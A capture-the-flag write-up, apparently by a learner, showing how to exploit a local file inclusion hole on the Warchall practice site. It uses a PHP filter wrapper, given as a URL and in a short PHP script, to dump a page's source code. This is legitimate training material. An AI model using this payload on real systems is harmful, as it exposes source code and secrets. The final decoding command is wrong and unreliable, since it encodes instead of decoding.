# Level 14 :
---
# _Warchall : Live LFI_
---
---
In this challenge of the LFI (Local File Inclusion), we are redirected to this link of LFI challenge web site : https://lfi.warchall.net/ .

First thing to do is to check the vulnerability of that web page. We remarque that if we click on the flag we see in the web site, we see that the propriety of the ling changes such as :
-   ```https://lfi.warchall.net/index.php?lang=en```
-   ```https://lfi.warchall.net/index.php?lang=de```

So I tryed to see what else can I put there so I tryed lot of things like    ```https://lfi.warchall.net/index.php?lang=solution``` , ```https://lfi.warchall.net/index.php?lang=solution.php```, etc
But something happen when I tryed this one : ```https://lfi.warchall.net/index.php?lang=solution.php```

There is a message there that says :``` "_teh falg si naer!
the flag is near!_ and "_fatal error: Uncaught TypeError: Cannot access offset of type string on string in /home/level/14_live_fi/www/index.php:12 Stack trace: #0 {main} thrown in /home/level/14_live_fi/www/index.php on line 12
Fatal error: Uncaught GWF_Exception: thrown in /opt/php/gwf3/core/inc/util/GWF_Log.php on line 249"_```

SO I did some research on how we can find the solution especially on Local File Inclusion and document myself on this website : https://www.php.net/manual/fr/filters.convert.php. Then got an idea how to solve it.

The purpose is to use a php wrapper on the link of the challenge to get the solution
First thing first is to write the php codethat you can put in your ```~```or you can also use ```/tmp```. In my case I used ```/tmp``` and redirect the solution in a file named ```solution_decoded.php``` :

```sh
<?php
$targetURL = 'http://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php';
$base64Content = file_get_contents($targetURL);
$decodedContent = base64_decode($base64Content);
file_put_contents('/tmp/solution_decoded.php', $decodedContent);
?>
```
This code consists on getting the url of the challenge which is ```https://lfi.warchall.net/index.php?lang=```use php wrapper, converting it on base64. Get the source code and decode it through the php code and look at the file ```solution_decode.php```

Now after creating that file, for example we name it ```lfi.php```, we should lunch it (execute it);
```sh
yourUsername@warchall:~$ php lfi.php
```
Then look at your ```solution_decoded.php```:
```sh
yourUsername@warchall:~$ cat /tmp/solution_decoded.php
```

There you go! -----------


Or you can also immediatelly use the url to get the solution without writing a php code on warchall box just using this url below :
```sh
view-source:https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php
```
and coping the first text you see on the source code of this page and write it on a file named for example ```level14_solution.txt``` then decode :
```sh
yourUsername@warchall:~$ base64 level14_solution.txt
```
There you go!


